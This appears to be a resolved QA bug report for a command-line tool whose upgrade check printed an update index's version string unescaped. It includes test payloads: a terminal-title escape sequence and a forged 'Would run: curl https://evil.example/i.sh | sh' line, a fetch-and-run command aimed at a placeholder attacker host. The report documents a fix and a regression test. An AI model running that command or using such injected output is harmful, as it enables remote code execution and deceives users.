# `bea upgrade --check` prints the index's `info.version` string unescaped, so a hostile index or redirected `BEA_UPDATE_API_URL` can inject terminal escape sequences and a forged `Would run:` line

**Trivial · cli · 10m · A1.** Real CLI QA, 2026-10-14, HEAD `bce2c992`, checkout `bea 0.3.1`, macOS 26.5.1. **Simulation:** the index response comes from a localhost mock reached through `BEA_UPDATE_API_URL`.

`_fetch_latest` returns `str(payload["info"]["version"])` without
validating it, and `_report` echoes it into `Latest release: …`. Server
text elsewhere in the CLI is made inert before it reaches the terminal
(w1/134, and the cloud commands' "Every value is server text: escape it
so it cannot drive the terminal"). This one is not. Because `upgrade
--check` exists to tell users which command to run, a forged `Would
run:` line matters. No product fix implemented.

Setup: a localhost mock returns `{"info":{"version":"2.0.0\u001b]0;PWNED\u0007"}}`.
The hunter also used an OSC 8 hyperlink plus `\nWould run: curl
https://evil.example/i.sh | sh`. Use isolated
BEA_CONFIG_DIR/XDG_CACHE_HOME, BEA_NO_UPDATE_NOTIFIER=1,
`BEA_UPDATE_API_URL=http://127.0.0.1:<port>`, and closed stdin.

```sh
bea upgrade --check
```

Actual: exit 0. stdout contains `Latest release: 2.0.0`, then raw ESC
`]0;PWNED` BEL, so the terminal title changes. With the hunter's payload,
a forged `Would run: curl https://evil.example/i.sh | sh` line appears
above the real `Would run: pipx upgrade beancount-io`. Reproduced by the
hunter three times and by me once (`od -c` shows `033 ] 0 ; P W N E D
\a`).

Control:

- `--json` keeps the value JSON-escaped.
- The passive notice and the `--version` hint print only when `newer()`
  parses a strict `X.Y.Z`, so they cannot carry this.
- The Homebrew channel extracts digits by regex.

Expected: server-supplied text is escaped before it is printed to a
terminal. A version that cannot be parsed is shown as `unknown`, or
quoted and inert.

Cause: `_report` (`cli/src/cli/commands/upgrade.py:216-218`) echoes
`latest` as is. `_fetch_latest` (`cli/src/cli/update.py:153`) does not
validate it.

Fix: validate with `release_parts()` (or a PEP 440 parse) and report
`unknown` for anything else, or print `single_line(latest)`. No
dependency change.

Blast radius: `bea upgrade --check` text output when the index response
is hostile or tampered with, or when `BEA_UPDATE_API_URL` is redirected.

Dedupe: searched `.pm/**`, including `done/`, for upgrade together with
escape, inert or terminal. w5/005 covers upgrade's package-manager stream
under `--json`, and w1/134 sets the convention. None covers this.

Acceptance: with the mock payloads, `upgrade --check` prints no raw
control characters and no forged line. A normal version prints
unchanged. A test pins both.

**Resolved.** `_report` (`cli/src/cli/commands/upgrade.py`) now passes the index's answer through `_shown_release`. A canonical `X.Y.Z` release (`update.release_parts`) prints unchanged. Anything else prints `Latest release: unknown (the index answered '…')`, with the text run through `single_line`: control characters become visible `\xNN` and newlines are folded. No escape sequence reaches the terminal, and the answer cannot add a line such as a forged `Would run:`. `--json` keeps the JSON-escaped value as before.

`tests/test_upgrade.py::test_a_hostile_index_answer_is_shown_inert` covers two payloads, the OSC title and the OSC 8 hyperlink plus newline-forged `Would run: curl … | sh`. In both, stdout has no ESC or BEL, the only `Would run:` line is the real `uv tool upgrade beancount-io`, and the release line reads `unknown (the index answered '…')`. The existing `9.9.9` tests still pass. With the fix stashed, both payloads fail.
